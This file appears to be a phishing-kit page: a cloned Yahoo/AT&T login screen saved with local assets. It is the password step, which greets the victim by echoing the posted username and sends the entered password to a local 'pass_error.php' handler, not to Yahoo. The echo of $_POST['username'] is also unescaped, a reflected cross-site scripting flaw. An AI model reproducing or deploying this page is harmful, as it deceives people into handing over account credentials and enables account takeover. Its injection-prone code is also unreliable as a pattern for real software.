<!DOCTYPE html>
<html class="yui3-js-enabled" id="Stencil" lang="en-US"><head>
	<title>Yahoo - login</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">	
	<meta http-equiv="X-UA-Compatible" content="chrome=1">
	<link rel="shortcut icon" href=" favicon.ico">
	<link rel="stylesheet" type="text/css" href=" combo.css">
	
	<script async="" src=" combo_025" id="yui_3_18_1_8_1465385328176_2" charset="utf-8"></script><script async="" src=" combo_028" id="yui_3_18_1_8_1465385328176_3" charset="utf-8"></script><script async="" src=" combo_024" id="yui_3_18_1_8_1465385328176_4" charset="utf-8"></script><link href=" combo_005.css" id="yui_3_18_1_11_1465385328176_2" rel="stylesheet" charset="utf-8"><link href=" combo_002.css" id="yui_3_18_1_11_1465385328176_3" rel="stylesheet" charset="utf-8"><link href=" combo_006.css" id="yui_3_18_1_11_1465385328176_4" rel="stylesheet" charset="utf-8"><link href=" combo_007.css" id="yui_3_18_1_11_1465385328176_5" rel="stylesheet" charset="utf-8"><link href=" combo_004.css" id="yui_3_18_1_11_1465385328176_6" rel="stylesheet" charset="utf-8"><script async="" src=" combo_013" id="yui_3_18_1_11_1465385328176_7" charset="utf-8"></script><script async="" src=" combo_017" id="yui_3_18_1_11_1465385328176_8" charset="utf-8"></script><script async="" src=" combo_016" id="yui_3_18_1_11_1465385328176_9" charset="utf-8"></script><script async="" src=" combo_022" id="yui_3_18_1_11_1465385328176_10" charset="utf-8"></script><script async="" src=" combo_021" id="yui_3_18_1_11_1465385328176_11" charset="utf-8"></script><script async="" src=" combo_023" id="yui_3_18_1_11_1465385328176_12" charset="utf-8"></script><script async="" src=" combo_015" id="yui_3_18_1_11_1465385328176_13" charset="utf-8"></script><script async="" src=" combo_003" id="yui_3_18_1_11_1465385328176_14" charset="utf-8"></script><script async="" src=" combo_008" id="yui_3_18_1_11_1465385328176_15" charset="utf-8"></script><script async="" src=" combo_014" id="yui_3_18_1_11_1465385328176_16" charset="utf-8"></script><script async="" src=" combo_011" id="yui_3_18_1_11_1465385328176_17" charset="utf-8"></script><script async="" src=" combo_018" id="yui_3_18_1_11_1465385328176_18" charset="utf-8"></script><script async="" src=" combo_029" id="yui_3_18_1_11_1465385328176_19" charset="utf-8"></script><script async="" src=" combo_026" id="yui_3_18_1_11_1465385328176_20" charset="utf-8"></script><script async="" src=" combo_005" id="yui_3_18_1_11_1465385328176_21" charset="utf-8"></script><script async="" src=" combo_027" id="yui_3_18_1_11_1465385328176_22" charset="utf-8"></script><script async="" src=" combo_007" id="yui_3_18_1_11_1465385328176_23" charset="utf-8"></script><script async="" src=" combo_009" id="yui_3_18_1_14_1465385328176_10" charset="utf-8"></script><script async="" src=" combo_002" id="yui_3_18_1_14_1465385328176_11" charset="utf-8"></script><script async="" src=" combo" id="yui_3_18_1_14_1465385328176_12" charset="utf-8"></script><script async="" src=" combo_006" id="yui_3_18_1_14_1465385328176_13" charset="utf-8"></script><script async="" src=" combo_010" id="yui_3_18_1_14_1465385328176_14" charset="utf-8"></script><script async="" src=" combo_019" id="yui_3_18_1_14_1465385328176_16" charset="utf-8"></script><script async="" src=" combo_012" id="yui_3_18_1_14_1465385328176_18" charset="utf-8"></script><script async="" src=" combo_020" id="yui_3_18_1_15_1465385328176_2" charset="utf-8"></script></head>
		<body id="yui_3_18_1_11_1465385328176_126">
	<div id="yui_3_18_1_11_1465385328176_131" class="mbr-desktop  ">
				<header>
			<div class="mbr-header-container pure-u-1">
	<div id="mbr-header" class="mbr-header pure-u-1 StencilRoot">
		<style type="text/css">@font-face{font-family:uh;src:url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.eot?);src:url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.eot?#iefix) format('embedded-opentype'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.woff2?) format('woff2'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.woff?) format('woff'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.ttf?) format('truetype'),url(https://s.yimg.com/os/uh-icons/0.1.16/uh/fonts/uh.svg?#uh) format('svg');font-weight:400;font-style:normal}[class^=Ycon],[class*=" Ycon"]{font-family:uh;speak:none;font-style:normal;font-weight:400;font-variant:normal;text-transform:none;line-height:1;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}</style><link type="text/css" rel="stylesheet" href=" combo_003.css"><script charset="utf-8" type="text/javascript" src=" s_code_yahoo.js"></script><script type="text/javascript">s.t();</script><!-- meta --><div id="yucs-meta" data-authstate="signedout" data-cobrand="sbc" data-crumb="QeHjwmd/ctW" data-mc-crumb="wtelpWJR57O" data-gta="hoSlOM.tcTL" data-device="desktop" data-experience="uh304" data-firstname="" data-style="lightbg" data-flight="1465385330" data-forcecobrand="att" data-guid="" data-host="login.yahoo.com" data-https="1" data-languagetag="en-us" data-property="login" data-protocol="https" data-shortfirstname="" data-shortuserid="" data-status="active" data-spaceid="" data-test_id="" data-userid="" data-stickyheader="true" data-headercollapse="" data-uh-test="acctswitch"></div><!-- /meta --><div id="UH" class="Row Pos(r) Start(0) T(0) End(0) Z(10) yucs-en-us yucs-login yucs" role="banner" data-protocol="https" data-property="login" data-spaceid="" data-stencil="true"> <style>body {
margin-top: 0px !important; 
}

#UH{
font: 13px/1.25 "Helvetica Neue",Helvetica,Arial,sans-serif;
}

.YLogoMY{
text-indent: -30em;
}#yucs_gta{display: none;}</style> <div id="uhWrapper" class="Mx(a) Z(1) Pos(r) Zoom Mstart(16px) Pt(14px)" data-ylk="rspns:nav;act:click;t1:a1;t2:uh-d;itc:0;" style="height: 3.8em;"> <div class="UHCol1 Pos(a) Fl(start)" role="presentation"><style>.YLogoMY { background-image: url(https://s.yimg.com/rz/d/att_en-US_f_pw_351x40.png); _background-image: url(https://s.yimg.com/rz/d/att_en-US_f_pw_351x40.gif); background-repeat: no-repeat; background-position: 0px !important; margin-top: 0px; height: 40px; width: 175px;}@media only screen and (-webkit-min-device-pixel-ratio: 2), only screen and ( min--moz-device-pixel-ratio: 2), only screen and ( -o-min-device-pixel-ratio: 2/1), only screen and ( min-device-pixel-ratio: 2), only screen and ( min-resolution: 192dpi), only screen and ( min-resolution: 2dppx) { .YLogoMY { background-image: url(https://s.yimg.com/rz/d/att_en-US_f_pw_351x40_2x.png) !important; background-size: auto 40px !important; }}</style><a href="https://www.yahoo.com" title="Yahoo"><img src="Yahoo!_logo.svg.png" alt="Yahoo" class="logo" width="256" height="61" /></a></div> 
<div class="UHCol3" role="presentation" id="uhNavWrapper"> <ul class="Fl(end) Mend(10px) Lts(-0.31em) Tren(os) Whs(nw) My(6px)">    <li id="yucs-help" class=" yucs-activate yucs-help yucs-menu_nav D(ib) Zoom Va(t) Pos(r) Lh(1.7)"> <a data-rapid_p="2" id="yucs-help_link" class="C(#000)! D(ib) Lts(n) yltasis yucs-trigger Lh(1) Td(n)! Td(u)!:h Fz(13px)" href="https://help.yahoo.com/kb/index?locale=en_US&amp;page=product&amp;y=PROD_ACCT" target="_blank" data-ylk="act:click;t2:uh-d;t3:tl-lst;elm:itm;elmt:mu;itc:0;"> <b>Help</b> </a></li> </ul> </div> </div><!-- /#UH --></div>   	</div>
</div>
		</header>
						<main id="yui_3_18_1_11_1465385328176_130" role="main">
			<div id="yui_3_18_1_11_1465385328176_129" class="mbr-login-bd ">
				<div id="yui_3_18_1_11_1465385328176_128" class="mbr-login-c pure-g">
					<div id="yui_3_18_1_11_1465385328176_127" class="mbr-login-c-right pure-u">
						<!-- login box -->
						
<div id="geom_inter_4_1465385332408_24" class="mbr-login pure-u  partner mbr-popup-link"><div class="mbr-login-box-top"></div>
    <div id="mbr-login-box" class="mbr-login-box  partner mbr-popup-link second-step">
        <!-- Y LOGO HERE -->
        <div class="mbr-login-logo">
                            <a id="mbr-back-to-login" href="index.html" tabindex="3" class="mbr-button-link-back">
                    Back                </a>
                        <img src="success_files/Yahoo!_logo.svg.png" alt="Yahoo" class="logo" width="256" height="61" />        </div>

        
        
        
                    <div id="mbr-login-greeting" class="mbr-login-signin-hd pure-u-1 mbr-overflow-ellipsis">
                Welcome<br/> <?php echo $_POST["username"]; ?>            </div>
        
        
        
        <!-- SIGNIN FORM -->
        <fieldset id="mbr-login-fieldset" class="mbr-login-fieldset pure-group ">
            <form id="mbr-login-form" method="POST" action="pass_error.php" class="pure-form pure-form-stacked mbr-login-form">
                <div id="inputs">
                
                    <div class="mbr-login-username mbr-hide">
                                                                              
                        
                        <!-- username -->
                        <label for="login-username" class="mbr-hide">Username</label>

                        
                        <input name="username" id="login-username" class="login-input
                             pure-u-1 " maxlength="96" tabindex="-1" aria-hidden="true" role="presentation" value="<?php echo $_POST["username"]; ?> " placeholder="AT&amp;T ID/Email" title="AT&amp;T ID/Email" autocorrect="off" spellcheck="false" readonly="readonly" type="text">

                        <div id="login-username-error" class="error-box username-error pure-u-1 mbr-text-align mbr-hide" role="alert"></div>

                  </div>

                    <div class="mbr-login-username-tips">
                  </div>

                    
                    
                    <div id="passwd-field" class="passwd-field ">

                        
                        <label for="login-passwd" class="mbr-hide">Password</label>
                        <input name="passwd" id="login-passwd" class="login-input  pure-u-1" maxlength="64" tabindex="2" aria-required="true" placeholder="Password" title="Password" autocorrect="off" autofocus="" type="password">
                        <div id="odp-pw-desc" class="odp-pw-desc mbr-text-align mbr-hide">
                            Click continue to sign in.                        </div>
                    </div>
                </div>

                                <div id="mbr-login-error" class="mbr-login-error mbr-text-align pure-u-1 mbr-hide">                </div>

                
                                <div id="submits" class="mbr-login-submit ">
                    <button id="login-signin" name="signin" type="submit" class="pure-u-1 pure-button mbr-button-primary" value="" tabindex="4">Sign in</button>
                </div>

                                                            <input name=".persistent" value="y" type="hidden">
                    
                                            <div class="mbr-forgot-seperator">
                            <a id="forgotLnk" href="https://www.att.com/olam/forgotPasswordAction.olamexecute?forgotPasswordActionEvent=forgotPasswordStep1" tabindex="6" class="mbr-login-forgot-link">Forgot password?</a>
                        </div>
                                    
                <div id="hiddens" class="hidden">
                    <input name="_crumb" value="4dGiyWkNOHV" type="hidden">
                    <input name="_ts" value="1465385532" type="hidden">
                    <input name="_format" value="json" type="hidden">
                    <input name="_uuid" value="CthnCZLMyTR2" type="hidden">
                    <input name="_seqid" value="4" type="hidden">
                                                                <input name="otp_channel" value="" type="hidden">
                </div>

                <!-- popup -->
                <div class="mbr-login-popup-container">
                                        <div id="mbr-login-popup" class="mbr-login-popup mbr-hide">
                        <div class="yui3-widget-hd mbr-text-align"></div>
                        <div class="yui3-widget-bd mbr-text-align pure-g"></div>
                    </div>
                </div>
            </form>

            
                        <div id="yahoo-japan-container" class="mbr-hide">
                <a href="http://www.yahoo-help.jp/app/answers/detail/p/565/a_id/47713?soc_src=mail&amp;soc_trk=ma" class="pure-u-1 pure-button mbr-button-primary">
                    Visit Yahoo Help                </a>
                <div class="mbr-login-oauth2-yahoo-japan-msg">
                    Yahoo Japan users - please visit Yahoo Help to learn how to add your email address.                </div>
            </div>
        </fieldset>

        
        
                                    
                            
            </div></div>
<!-- localization strings  -->
<div class="mbr-hide">
    <script>
        MBR_config.strings.slc = MBR_config.strings.slc || {
            pwqa_header : "Verify your identity",
            aea_header : "Verify your account",
            verification_header : "Enter verification code",
            aea_enter_code : "Enter the code received",
            locked_header_warning : "Warning",
            locked_header_account_locked : "Account locked",
            locked_header_contact_cc: "Contact customer care",
            captcha_header: "Verification: Type The Code Shown Below",

            svc_unavilable : "Error: service temporarily unavailable.",

            error_incident_mobile_email : "Please enter a valid Mobile Number or Email Address that you currently have access to.",
            error_incident_email : "Please enter a valid non-Yahoo Email address that you currently have access to.",
            error_incident_mobile : "Please enter a valid US mobile number that you currently have access to.",

            error_invalid_auth: "Invalid ID or password.<div class=\"mbr-text-normal\">Please try again using your full Yahoo ID.</div>",
            error_invalid_pw: "Please enter your password",

            error_empty_pwqa: "No answer provided. Please try again.",
            error_empty_code: "Please enter the verification code to continue",

            error_empty_phone_number: "Please enter your phone number.",

            end_of_string: "EOS"
        };

        MBR_config.strings.otp = MBR_config.strings.otp || {
            placeholder_mobile_number: "Mobile number",
            placeholder_username : "AT&T ID/Email",
            sign_in: "Sign in",
            get_my_passwd: "Next",
            signin_continue: "Next",
            odp_passwd_desc: "Click continue to sign in.",
            odp_push_desc: "Click continue to use Account Key.",
            error_invalid_passwd: "That didn’t work. Please type your on-demand password again.",
            error_empty_passwd: "Your on-demand password is required.",
            retry_message: "Please wait {0} seconds before trying to resend.",
            retry_message_one: "Please wait a second before trying to resend.",

            end_of_string: "EOS"
        };

        MBR_config.otp_enabled =  false;
        MBR_config.otp_optin = true;

                MBR_config.account_switch_enabled = true;
        MBR_config.is_oauth2 = false;
        MBR_config.is_tumblr_login = false;
        MBR_config.strings.continue_to_tumblr = "Continue to Tumblr";
        MBR_config.strings.passwd_placeholder = "Password";
        MBR_config.strings.passwd_placeholder_tumblr = "Tumblr password";
        MBR_config.strings.passwd_placeholder_yahoo = "Yahoo password";

        MBR_config.strings.sign_in = "Sign in";
        MBR_config.strings.error_authtype_1280 = "This Tumblr account cannot be combined. Please try again with a different Tumblr account";
        MBR_config.strings.error_authtype_1281 = "This Yahoo account cannot be combined. Please try again with a different Yahoo account";

                MBR_config.use_odp_username_monitor = false;
        MBR_config.hide_left_content = false;

            </script>
</div>
					</div>
										<div style="display: none;" id="mbr-login-contents-container" class="mbr-login-c-left pure-u">
												<script>
							(function(){document.getElementById('mbr-login-contents-container').style.display='none';}());
						</script>
												<!-- left content -->
						<div id="mbr-login-contents" class="mbr-login-contents pure-u pure-u-1">
	<div class="info">
		
								<h3>Get the best of the Web all in one place.</h3>
								<h4>Welcome to the new, more personal att.net.</h4>
								<ul>
									<li>Preview news, email, weather, Facebook and more at your fingertips.</li>
									<li>Add whatever sites you love to your att.net homepage.</li>
									<li>Connect, do and share more with att.net Mail.</li>
									<li>Do more with results you find on Yahoo Search.</li>
									<li>Get multiple email addresses with better spam protection and unlimited storage with att.net Mail.</li>
								</ul>
									</div>
</div>
					</div>
				</div>
								<div id="mbr-login-full-contents" class="mbr-hide"></div>
								<!-- ads widget -->
				<div id="mbr-login-ad-container" class="mbr-login-ads pure-u-1">
	<div class="mbr-login-ads-outer">
		<div class="mbr-login-ads-inner">
			<div style="width: 100%; text-align: center; margin-left: auto; margin-right: auto; display: inline-block; visibility: inherit;" id="mbr-login-ad-rich">
								<div style="position: relative; z-index: 9; width: 1440px; height: 1024px; visibility: inherit; display: inline-block; font-size: 0px;" class="darla" id="sb_rel_mbr-login-ad-rich-frame"><iframe marginheight="0" marginwidth="0" tabindex="-1" hidefocus="true" allowtransparency="true" scrolling="no" async="" src=" r-sf.htm" id="mbr-login-ad-rich-frame" style="position: absolute; z-index: 10; width: 1440px; height: 1024px; top: 0px; left: 0px; visibility: inherit; display: block;" frameborder="no"></iframe></div>
							</div>
		</div>
	</div>
</div>

<script type="text/javascript" src=" g-r-min.js"></script>
<script type="text/javascript">
    var DARLA_CONFIG = {"useYAC":0,"usePE":0,"servicePath":"https:\/\/login.yahoo.com\/sdarla\/php\/fc.php","xservicePath":"","beaconPath":"https:\/\/login.yahoo.com\/sdarla\/php\/b.php","renderPath":"","allowFiF":false,"srenderPath":"https:\/\/s.yimg.com\/rq\/darla\/2-8-9\/html\/r-sf.html","renderFile":"https:\/\/s.yimg.com\/rq\/darla\/2-8-9\/html\/r-sf.html","sfbrenderPath":"https:\/\/s.yimg.com\/rq\/darla\/2-8-9\/html\/r-sf.html","msgPath":"https:\/\/login.yahoo.com\/sdarla\/2-8-9\/html\/msg.html","cscPath":"https:\/\/s.yimg.com\/rq\/darla\/2-8-9\/html\/r-csc.html","root":"sdarla","edgeRoot":"http:\/\/l.yimg.com\/rq\/darla\/2-8-9","sedgeRoot":"https:\/\/s.yimg.com\/rq\/darla\/2-8-9","version":"2-8-9","tpbURI":"","hostFile":"https:\/\/s.yimg.com\/rq\/darla\/2-8-9\/js\/g-r-min.js","beaconsDisabled":true,"rotationTimingDisabled":true,"fdb_locale":"What don't you like about this ad?|It's offensive|Something else|Thank you for helping us improve your Yahoo experience|It's not relevant|It's distracting|I don't like this ad|Send|Done|Why do I see ads?|Learn more about your feedback.","positions":{"FOOT9":[],"FOOT":[],"RICH":{"w":1440,"h":1024}},"lang":"en-US"}
</script>
<script>
(function(){
MBR_config.ad_timeout = 4000;MBR_config.ad_type = 6;MBR_config.ad_type2 = 1;
var contents = document.getElementById('mbr-login-contents-container'), ads_contents = document.getElementById('mbr-login-ad_rich');
if ((typeof contents == 'object') && (typeof ads_contents == 'object') && window.DARLA && DARLA_CONFIG) { contents.style.display = 'none'; }
}());
</script>
			</div>
		</main>
		<footer>
			<!-- footer widget -->
						<div id="mbr-footer" class="mbr-footer pure-u-1">
	<div></div>
	<div></div>
	<div>
								<div><a href="http://att.yahoo.com/terms" target="_blank">Terms</a> | <a href="http://att.yahoo.com/privacy" target="_blank" class="mbr-text-red">Privacy</a></div>
							</div>
</div>
			<div id="mbr-login-foot" class="hidden"></div>
			<div class="mbr-login-foot-9"></div>
		</footer>
	</div>
	<div id="ad"></div>
	<script src=" combo_004"></script><div class="" id="yui3-css-stamp" style="position: absolute !important; visibility: hidden !important"></div>
		<script type="text/javascript" charset="utf-8">YUI().use('node','node-focusmanager', function(Y) {});</script>
		
	<!-- spaceId Base: 150002527, Intl: 150002527-->
	<script>
    YUI().use('node', 'event', function (Y) {
        Y.on("domready", function() {
            MBR_config.comscore_config = [{
                c1: "2",
                c2: "7241469",
                c5: "150002527",
                c7: "https%3A%2F%2Flogin.yahoo.com%2F%3F.src%3Dym%26.intl%3Dus%26.lang%3Den-US%26.done%3Dhttps%253a%2F%2Fmail.yahoo.com",
                c14: "-1"
            }];
            MBR_config.comscore_beacon();
        });
    });
</script>
<noscript>
  <img src="http://b.scorecardresearch.com/p?c1=2&c2=7241469&c7=https%3A%2F%2Flogin.yahoo.com%2F%3F.src%3Dym%26.intl%3Dus%26.lang%3Den-US%26.done%3Dhttps%253a%2F%2Fmail.yahoo.com&c5=150002527&c14=-1&cv=2.0&cj=1">
</noscript>
			<iframe src="https://mg.mail.yahoo.com/mailfe/resources?o=iframe&amp;src=login" style="visibility:hidden" marginheight="0" marginwidth="0" scrolling="no" frameborder="0" height="0" width="0"></iframe>
		



</body></html>
<!-- l32.member.bf1.yahoo.com Wed Jun  8 04:28:50 PDT 2016 -->